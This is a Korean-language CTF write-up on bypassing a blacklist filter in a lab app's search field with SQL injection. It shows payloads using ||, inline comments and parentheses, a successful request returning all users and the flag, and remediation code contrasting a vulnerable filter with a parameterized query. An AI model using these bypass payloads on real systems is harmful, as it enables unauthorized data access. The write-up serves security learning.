+++
title = "VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Silver", "Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SQL Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SQLi)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/sqli/silver`
- **목표**: WAF(Web Application Firewall) 또는 백엔드 필터링 로직을 우회하여 인증을 무력화하거나 숨겨진 데이터를 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 표면적 분석 (Reconnaissance)

`/sqli/silver` 페이지는 사용자 이름을 입력하여 해당 사용자의 프로필을 검색하는 기능입니다. 
URL 요청은 다음과 같습니다.
```http
GET /sqli/silver?search=admin
```

응답 결과:
```html
<p>User: admin</p>
<p>Email: admin@luxora.test</p>
```

Bronze 단계에서 성공했던 `OR 1=1` 공격을 시도해 봅니다.
```http
GET /sqli/silver?search=admin' OR '1'='1
```

### 🚨 방어 로직 확인
서버에서 다음과 같은 에러를 반환합니다.
```text
[Blocked] Malicious input detected! No spaces or 'OR' keyword allowed.
```

**[해커의 사고 과정]**
1. 개발자가 공격을 막기 위해 **블랙리스트(Blacklist)** 기반의 필터링을 걸어두었다.
2. 에러 메시지로 보아, **공백 문자(Space)**와 **`OR`** 라는 대문자 키워드가 명시적으로 차단되었다.
3. 데이터베이스 쿼리를 조작하려면 논리 연산자(OR)와 띄어쓰기가 필수적인데, 이를 대체할 방법을 찾아야 한다.

---

## 💥 2. 필터링 우회 전략 설계 (Bypass Techniques)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: ' OR 1=1 -- )--> [ Web Server ]
                                        |-- Query: SELECT * FROM users WHERE name='' OR 1=1 --'
                                        |-- Returns All Users
```


블랙리스트 기반 필터링은 언제나 구멍이 존재합니다. 우리는 SQL 엔진이 찰떡같이 알아듣는 다른 기호들을 사용하여 이 필터를 피할 것입니다.

### 전략 1: 공백(Space) 우회
SQL에서 띄어쓰기를 대신할 수 있는 문자는 매우 많습니다.
- 주석 처리 기호: `/**/` (인라인 주석은 훌륭한 띄어쓰기 대체재입니다)
- 탭 문자: `%09`
- 개행 문자: `%0a`
- 괄호 묶기: `()` (연산의 우선순위를 정하는 괄호는 공백 없이도 구문을 나눌 수 있습니다)

### 전략 2: `OR` 키워드 우회
`OR` 이라는 알파벳을 쓸 수 없다면, 기호를 사용하면 됩니다.
- 논리 연산자 기호: `||` (MySQL 등 여러 DBMS에서 OR과 동일하게 동작)

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

위에서 세운 전략을 바탕으로 페이로드를 진화시켜 보겠습니다.

### 💡 페이로드 진화 과정
1. **목표 쿼리 조작**: `admin' OR 1=1`
2. **OR 우회**: `admin' || 1=1`
3. **공백 우회 (주석 사용)**: `admin'/**/||/**/1=1`
4. **공백 우회 (괄호 사용)**: `admin'||(1=1)`

가장 깔끔하고 짧은 **괄호 우회법**을 사용하여 뒤의 남은 쿼리를 무시하게 만드는 주석(`#` 또는 `--`)을 붙여 전송해 보겠습니다.

### 페이로드 전송 (공격 실행)
URL에 인코딩을 적용하여 보냅니다. (`#`는 URL에서 fragment를 의미하므로 반드시 `%23`으로 인코딩해야 합니다.)

```http
GET /sqli/silver?search=admin'||(1=1)%23
```

### 서버의 응답 (결과)
우리의 입력값에는 공백도 없고, `OR`이라는 글자도 없었으므로 보안 필터(WAF)를 무사히 통과했습니다.
백엔드의 데이터베이스는 `search = 'admin' || (1=1) #'` 로 쿼리를 해석하여 모든 결과를 반환합니다!

```html
<div class="search-results">
  <p>1. admin (admin@luxora.test)</p>
  <p>2. testuser (test@luxora.test)</p>
  ...
  <p class="flag">[!] CONGRATULATIONS! FLAG: FLAG{SQLI_🥈_BYPASS_F92C4A}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

단순한 블랙리스트 기반 필터링은 SQL의 다양한 문법적 유연성(기호, 주석 등)을 이용해 손쉽게 우회할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{SQLI_🥈_BYPASS_F92C4A}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 단계의 취약점 원인은 **'잘못된 방어 방식(Blacklisting)'**에 있습니다. 개발자는 해커가 사용할 수 있는 모든 공격 문자열을 예상하고 막을 수 없습니다.

* **취약한 방어 코드 예시 (정규식 필터링)**
```javascript
// 해커는 || 나 /**/ 를 쓰면 쉽게 우회함
if (req.query.search.includes(" ") || req.query.search.includes("OR")) {
    return res.send("[Blocked] ...");
}
const query = "SELECT * FROM users WHERE name = '" + req.query.search + "'";
```

* **안전한 패치 코드 (화이트리스트 및 Prepared Statements)**
SQL 인젝션의 유일하고도 완벽한 해결책은 언제나 **파라미터화된 쿼리(Prepared Statements)**입니다. 어떤 문자가 들어오든 구조를 깨지 못하게 만들어야 합니다.
```javascript
const query = "SELECT * FROM users WHERE name = $1";
db.query(query, [req.query.search], ...);